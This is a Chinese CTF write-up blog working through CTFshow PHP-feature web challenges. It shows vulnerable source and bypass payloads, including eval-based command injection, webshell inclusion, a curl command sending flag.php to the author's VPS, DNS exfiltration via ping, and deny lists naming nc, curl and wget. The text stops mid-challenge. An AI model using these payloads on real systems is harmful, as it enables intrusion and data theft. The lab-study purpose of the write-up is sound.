---
title: CTFshow_web入门_php特性
date: 2021-03-08 00:00:35
updated: 2021-03-08 00:00:35
categories: web入门
---

 CTFshow-web入门-php特性 （web89-web150_plus）<!--more-->

## web 89

```php
<?php


include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```

![](https://img.npfs06.top/20210308000635.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

构造数组绕过即可

payload:?mun[]=1



## web 90

![](https://img.npfs06.top/20210308001525.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## web 91

```php
<?php

show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```

```
/i  表示匹配的时候不区分大小写

/m 表示多行匹配，什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号
```

这里主要的突破点就是/m，我们可以看到第一个preg_match()函数，有个/m，而第二个正则则没有，我们可以利用换行进行绕过

payload:?cmd=%0aphp

注：%0a是换行的意思



## web 92

和web90是一样的

payload：?num=0x117c



## web 93

```php
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```



过滤了字母，十六进制弄不了，那就改八进制

payload：?num=010574

4476的八进制为10574



## web 94

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

**strpos()**

![](https://img.npfs06.top/20210308001550.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

对于strpos()函数，我们可以利用换行进行绕过（%0a）

payload:?num=%0a010574



也可以小数点绕过

payload：?num=4476.0

因为intval()函数只读取整数部分



还可以八进制绕过(%20是空格的url编码形式)

payload：?num=%20010576



## web 95

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```



八进制绕过

payload：?num=%20010576

Payload:   ?num=+010574



## web 96

```php
<?php

highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }


}
```

paylaod:?u=./flag.php

意思就是说显示当前目录下的flag.php文件



## web 97

```php
<?php


include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
else
print 'Wrong.';
}
?>
```

md5碰撞

payload: a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2



payload:a[]=1&b[]=1



## web 98

```php
<?php

include("flag.php");
$_GET?$_GET=&$_POST:'flag';  
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);

?> 
```

稀里糊涂的就出flag了，讲下大概思路

主要是三元运算符和变量覆盖

$_GET?$_GET=&$_POST:'flag';   意思就是说如果存在GET请求，则将POAT请求覆盖掉GET请求

highlight_file($_GET['HTTP_FLAG']=='flag'?$flag: __FILE __);   意思就是说GET传参HTTP_FLAG的值为flag，则读取flag

所以我就构造了GET：?flag=123

POST：HTTP_FLAG=flag



然后就得到了flag





## web 99

```php
<?php

highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

?> 
```

**in_array弱类型比较**

```php
$allow = array(1,'2','3');
var_dump(in_array('1.php',$allow));
返回的为true

$allow = array('1','2','3');
var_dump(in_array('1.php',$allow));
返回false
```



![](https://img.npfs06.top/20210308001609.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](https://img.npfs06.top/20210308001623.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

之后在cat flag36d.php即可



## web 100-101

```php
<?php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}

?>
```

知识点：

**and 和 && 区别**

```php
Watch out for the difference of priority between 'and vs &&' or '|| vs or':
<?php
$bool = true && false;
var_dump($bool); // false, that's expected

$bool = true and false;
var_dump($bool); // true, ouch!

$bool = true and false;
if($bool)
    print (1)   //输出为1，因为$bool值为真

if(true and false)
    print (1);
else
    print (0);     //输出为0 ，在if语句中，只有全为真才为真

?>
Because 'and/or' have lower priority than '=' but '||/&&' have higher.
```

所以只要保证v1是数字就可以使得v0为true，从而进入if中

payload:

> ?v1=1&v2=var_dump($ctfshow)/*&v3=*/;
> ?v1=1&v2=?><?php echo `ls`?>/*&v3=;*/
> ?v1=1&v2=-system('ls')-&v3=-1;
> ?v1=1&v2=echo&v3=;system('ls');
> ?v1=1&v2=var_dump(get_class_vars(&v3=);

**还有一种方法是通过发射类ReflectionClass，输出class ctfshow**

> **ReflectionClass** 类报告了一个类的有关信息。

简单来说反射类就是存放了类里的所有东西。
最简单的方法直接输出这个类即可，也就是构造出 `echo new ReflectionClass('ctfshow');`

payload:`?v1=1&v2=echo new ReflectionClass&v3=;`



## web 102-103

```php
<?
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}

?>
```

$v4为真执行，则$v2需要是数字。使用回调函数`call_user_func`，调用$v1的函数，将$s 作为参 数 ，将str写入v3参数

知识点：

```php
在php5x的环境下is_numeric可以识别十六进制，返回值为true
在php7x的环境下is_numeric不可以识别十六进制，返回值为false

    
<?php
var_dump(is_numeric("0x3c3f706870206576616c28245f504f53545b315d293b3f3e"));
?>
//返回值 bool(false)
//环境为php7
```

题目环境为php7，所有不能使用十六进制编码绕过，

要让v2均为数字，首先我们考虑写入1.php时，利用伪协议写入恶意代码,同时让$v1为hex2bin (将十六进制转为ascii)

```
get:v2=？？？&v3=php://filter/write=convert.base64-decode/resource=1.php
post: v1=hex2bin
```

所以我们要考虑的就是如何让我们写入的恶意代码base64编码后，经16进制编码全为数字

```
$a='<?=`cat *`;';
$b=base64_encode($a);  // PD89YGNhdCAqYDs=
$c=bin2hex($b);      //等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，=和带着=的base64解码出来的内容是相同的。
输出   5044383959474e6864434171594473

//带e的话会被认为是科学计数法，可以通过is_numeric检测
```

同时因为经过substr处理,从第三个字母开始取，所以v2前面还要补00
payload:

```php
get:v2=005044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
post: v1=hex2bin
```

写入成功后访问1.php，查看源码即可得到flag





## web 104

```php
<?php

highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}

?>
```

类似md5碰撞

```
#payload
aaK1STfY
0e76658526655756207688271159624026011393
aaO8zKZF
0e89257456677279068558073954252716165668

#payload：
GET：v2[]=1
POST: v1[]=2

#payload
GET:v2=a
POST:va=a
```



## web 105

```php
<?php

highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);

?>
```

先放payload:

![](https://img.npfs06.top/20210308001645.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

```
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
//这是一步变量覆盖，我们传入suces=flag,最终会得到
//$suces=$flag，就是说将flag赋值给了suces变量
```

![](https://img.npfs06.top/20210308001702.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

我们可以看到在只有GET请求的时候，报的是error错误，这也就说明我们只要将flag赋值给error变量即可

```
foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
//我们POST传入error=suces,最终得到$error=$suces,结合GET请求，推出$error=$flag，即成功将flag的值赋值给了error变量

```



## web 106

```php
<?php
highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){
        echo $flag;
    }
}

?>
```

payload

GET : v2[]=1

POST: v1[]=2



## web 107

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }

}
?>
```

知识点：

**parse_str函数的使用**

```php
parse_str — 将字符串解析成多个变量

parse_str ( string $encoded_string [, array &$result ] ) : void

如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。
```

例子：

```php
<?php
$str = "first=value&arr[]=foo+bar&arr[]=baz";
// 推荐用法
parse_str($str, $output);
echo $output['first'];  // value
echo $output['arr'][0]; // foo bar
echo $output['arr'][1]; // baz
```

**payload**

```
GET : v3=flag
POST: v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc
```

```
GET : v3=240610708  //利用科学计数法绕过
POST: v1=flag=0
```



## web108

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}

?>
```

知识点：

**ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配**

函数介绍

```php
strrev()  字符串反转
intval()  获取变量的整数值
12
payload:c=a%00778
```

payload:

> c=a%00778

正则表达式只会匹配%00之前的内容，后面的被截断掉，

通过反转成877%00a，再用intval函数获取整数部分得到877，877为0x36d的10进制。



## web109

```php
<?
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }

}
?>
```

知识点：

Exception 异常处理类 <http://c.biancheng.net/view/6253.html> 

php发射类ReflectionClass

```
payload:
v1=Exception();system('cat /fl36dg.txt');//&v2=a
v1=ReflectionClass&v2=system('cat /fl36dg.txt')
```



## web110

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");

}

?>
```

知识点：
**php内置类 利用 FilesystemIterator 获取指定目录下的所有文件 <http://phpff.com/filesystemiterator> <https://www.php.net/manual/zh/class.filesystemiterator.php> **

**getcwd()函数 获取当前工作目录 返回当前工作目录**

payload:

> v1=FilesystemIterator&v2=getcwd
>
> 然后直接url访问flag文件即可



## web111

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}


if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }

}

?>
```

知识点：**GLOBALS**

> $GLOBALS — 引用全局作用域中可用的全部变量
> 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。

例子：

```php
$a=123;
$b=456;
var_dump($GLOBALS);
123
```

```
["a"]=>
int(123)
["b"]=>
int(456)
```

只要把$GLOBALS赋值给v2，然后v2再赋值给v1,即可将全部变量输出。又因为$v1要匹配到ctfshow

payload：

> ?v1=ctfshow&v2=GLOBALS



## web112

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

>is_file — 判断给定文件名是否为一个正常的文件
>is_file ( string $filename ) : bool

我们的目的是不能让is_file检测出是文件，并且 highlight_file可以识别为文件

直接用不带任何过滤器的filter伪协议

```
file=php://filter/resource=flag.php
```

也可以用一些没有过滤掉的编码方式和转换方式

还有一些其他的，可以参考[php文档](https://www.php.net/manual/zh/mbstring.supported-encodings.php)

**payload:**

```
file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
file=compress.zlib://flag.php
file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php
```



## web113

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
?>
```



payload:

> file=comporess.zlib//flag.php

payload:

> file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php

**在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容.多次重复后可以绕过is_file**



## web114

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function filter($file){
    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 师傅们居然tql都是非预期 哼！
```

payload:

> ?file=php://filter/resource=flag.php



## web 115



**trim — 去除字符串首尾处的空白字符（或者其他字符）**

```
说明 ¶
trim ( string $str , string $character_mask = " \t\n\r\0\x0B" ) : string
此函数返回字符串 str 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符：

" " (ASCII 32 (0x20))，普通空格符。
"\t" (ASCII 9 (0x09))，制表符。
"\n" (ASCII 10 (0x0A))，换行符。
"\r" (ASCII 13 (0x0D))，回车符。
"\0" (ASCII 0 (0x00))，空字节符。
"\x0B" (ASCII 11 (0x0B))，垂直制表符。
```

fuzz下

```php
<?php
for ($i=0; $i <128 ; $i++) {
    $x=chr($i).'1';
    if(is_numeric($x) and trim($x)!=='1'){
        echo urlencode(chr($i))."\n";
    }
}
?>
//%0C (换页符)
```

payload:

> ?num=%0C36



## web123

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```

第一个需要绕过的地方`isset($_POST['CTF_SHOW.COM'])`，因为php变量命名是不允许使用点号的

PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格 + . [转换为_
但是有一个特性可以绕过,使变量名出现.之类的
特殊字符[, GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了
如 CTF[SHOW.COM=>CTF_SHOW.COM

可以测试一下

```php
<?php
var_dump($_POST);
?>
输入 CTF_SHOW.COM=1
返回
array (size=1)
  'CTF_SHOW_COM' => string '1' (length=1)

    输入 CTF[SHOW.COM=1
返回
array (size=1)
  'CTF_SHOW.COM' => string '1' (length=1)
```

payload:

> post: CTF_SHOW=&CTF[SHOW.COM=&fun=echo $flag

直接在`eval("$c".";"); `这一步就将flag输出，不继续进行下一个flag的比较

## web125

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>

```



php中的`$_SERVER['argv']` 

1. 在cli模式下(命令行)
   `$_SERVER['argv'][0] `为文件名,其余是传递给脚本的参数

![](https://img.npfs06.top/20210308001803.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



2.在web网页模式下

在php.ini开启register_argc_argv配置项 设置register_argc_argv = On

> php.ini :
> register_argc_argv = On

`$_SERVER['argv'][0] `为我们传递的第一个参数

![](https://raw.githubusercontent.com/npfs06/Images/main/img/20210222183051.png)

所以可以控制`$a['0']`

**解法一：**

payload：

```
POST CTF_SHOW=1&CTF[SHOW.COM=1&fun=assert($a[0])
GET /?$fl0g=flag_give_me;
```



**解法二**

在`$_SERVER['argv'][0]`中，对于传递的参数，可以通过加号`+`进行分割

![](https://raw.githubusercontent.com/npfs06/Images/main/img/20210222183825.png)

payload:

> parse_str() 函数把查询字符串解析到变量中。

```
get: a=1+fl0g=flag_give_me
post: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
```

```
get: a=1+$fl0g=flag_give_me
post: CTF_SHOW=&CTF[SHOW.COM=&fun=assert($a[1])
```



**解法三**

payload:

```
GET:?1=flag.php POST:CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_GET[1])
```



## web126

同web125

payload:

```
get: a=1+fl0g=flag_give_me
post: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
```



## web127

```php
<?php

error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];


//特殊字符检测
function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);
}


if($ctf_show==='ilove36d'){
    echo $flag;
}
```



> $_SERVER["QUERY_STRING"]  获取查询 语句，获取的是GET传参?后面的值

http://localhost/aaa/index.php?p=222&q=333
结果：
$_SERVER['QUERY_STRING'] = "p=222&q=333";

在国家php解析特性：

![](https://raw.githubusercontent.com/npfs06/Images/main/img/20210223101059.png)

payload:

```
?ctf%20show=ilove36d
```



## web128

```php
<?php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}



function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
} NULL
```

知识点：gettext拓展的使用

在开启该拓展后 _() 等效于 gettext()

```php
<?php
echo gettext("phpinfo");
结果  phpinfo

echo _("phpinfo");
结果 phpinfo
```

所以 `call_user_func('_','phpinfo')` 返回的就是phpinfo

因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars

```php
get_defined_vars ( void ) : array
此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。
```

![](https://raw.githubusercontent.com/npfs06/Images/main/img/20210223102205.png)

payload:

> ?f1=_&f2=get_defined_vars



## web129

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
}
```

**解法一：**

利用目录穿越漏洞绕过 stripos 检测字符

> stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）

`paylaod: ?f=/ctfshow/../../../../../../../../../var/www/html/flag.php`

**解法二：**

php伪协议绕过

`payload: ?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php`
filter伪协议支持多种编码方式，无效的就被忽略掉了。

**解法三：**

远程文件包含，在自己的服务器上写个一句话，然后保存为txt文档。
例如 f=http://url/xxx.txt?ctfshow
其中xxx.txt为一句话



## web130

  ```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}

  ```

知识点：利用正则最大回溯次数绕过

PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit
回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。

```python
import requests
url="http://f6736092-7d96-46c5-bfb7-a31f636efae9.chall.ctf.show:8080/"
data={
   'f':'very'*250000+'ctfshow'
}
r=requests.post(url,data=data)
print(r.text)
```

非预期解

```
利用数组 f[]=ctfshow
```



## web131

同web130

```python
import requests
url="http://8715c060-efb8-4525-a41e-7fe820b209d8.chall.ctf.show:8080/"
data={
	'f':'very'*250000+'36Dctfshow'
}
r=requests.post(url,data=data)
print(r.text)
```



## web132

扫描后台目录，存在/admin

或者访问/robots.txt,之后访问/admin

```php
<?
include("flag.php");
highlight_file(__FILE__);


if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];

    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        
        if($code == 'admin'){
            echo $flag;
        }
        
    }
}
```

知识点： `||`优先级低于`&&`，对于与”（&&） 运算： x && y 当x为false时，直接跳过，不执行y； 对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y

```php
<?php
if (false && false || true){
    echo 123;
}
?>
//123
```

所以说我们只要让`$username ==="admin"`j即可绕过第一个if语句

payload:

> ?username=admin&password=1&code=admin





## web133

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}
```

新姿势：传递的参数就是`$F`本身，发生变量覆盖

利用方法：

我们传递`?F=$F;+sleep 3`可以发现网址确实sleep了一会说明的确执行了命令

```
因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数
这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。
而$F就是我们输入的`$F`;+sleep 3 使用substr()函数的代码应该是
eval(`$F`; );
经过最后的变量覆盖为
eval(`$F`;+sleep 3`),就执行成功
```

所以我们可以这么利用

````
# payload 
#其中-F 为带文件的形式发送post请求
#xx是上传文件的name值，flag.php就是上传的文件 
?F=`$F`;+curl -X POST -F xx=@flag.php vps的公网IP:端口
````

nc监听即可



当然也可以使用Burp的 Collaborator Client （ Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies）

![](http://img.npfs06.top/20210227105247.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## web134

```php
<?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
```

考察数组变量覆盖，举个例子：

```
parse_str($_SERVER['QUERY_STRING']);
var_dump($_POST);
```

传入`?_POST['a']=123`，输出`array(1) { ["'a'"]=> string(3) "123" }`

Payload:

```
?_POST[key1]=36d&_POST[key2]=36d
```



## web135

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
}
```

payload:

```
## 重定向
?F=`$F`;+nl flag.php>flag

## 重命名
?F=`$F `;mv flag.php 1.txt 

## 文件写入
?F=$F; cp flag.php 1.txt

## ping
?F=$F;+ping cat flag.php|awk 'NR==2'.6x1sys.dnslog.cn
```



## web136

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
